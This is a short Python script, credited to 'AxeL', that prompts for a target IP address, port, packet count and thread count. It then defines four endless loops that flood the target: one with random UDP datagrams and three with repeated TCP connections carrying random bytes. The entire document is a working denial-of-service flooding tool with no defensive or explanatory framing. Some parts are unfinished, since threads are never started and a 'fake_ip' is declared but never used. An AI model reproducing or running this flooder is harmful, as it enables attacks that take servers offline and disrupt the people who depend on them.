#!/usr/bin/env python3
#Code by AxeL
import struct
import time
import random
import socket
import threading

ip = str(input("\033[95m=====> + IP Target    : "))
port = int(input("=====> + PORT Target  : "))
times = int(input("=====> $ Send PACKETS : "))
threads = int(input("=====> $ Send THREADS : "))
choice = str(input("=====> × Ready? (y/n) : "))
fake_ip = '182.21.20.32'
#Starting Attacking

def run():
	data = random._urandom(1460)
	i = random.choice(("[•]","[!]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[96m AxeLOREZ Send Packets To Ip \033[91m{ip} \033[96mPort \033[91m {port}")
		except:
			print("\033[96m[•] AxeLOREZ Send Packets To Ip \033[91m{ip} \033[96mPort \033[91m {port}")

def run2():
	data = random._urandom(1030)
	i = random.choice(("[•]","[!]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\u001b[31m AxeLOREZ Send Packets To Ip Port\033[92m ==========> {}:{} \u001b[31m".format(ip, port))

		except:
			s.close()
			print("\u001b[31m[•] AxeLOREZ Send Packets To Ip Port\033[92m ==========> {}:{} \u001b[31m".format(ip, port))
            

def run3():
	data = random._urandom(777)
	i = random.choice(("[•]","[!]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\u001b[31m AxeLOREZ Send Packets To Ip Port\033[92m ==========> {}:{} \u001b[31m".format(ip, port))
		except:
			s.close()
			print("\u001b[31m[•] AxeLOREZ Send Packets To Ip Port\033[92m ==========> {}:{} \u001b[31m".format(ip, port))
            
  
def run4():
	data = random._urandom(17)
	i = random.choice(("[+]","[!]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\u001b[31m AxeLOREZ Send Packets To Ip Port\033[92m ==========> {}:{} \u001b[31m".format(ip, port))
		except:
			s.close()
			print("\u001b[31m[•] AxeLOREZ Send Packets To Ip Port\033[92m ==========> {}:{} \u001b[31m".format(ip, port))
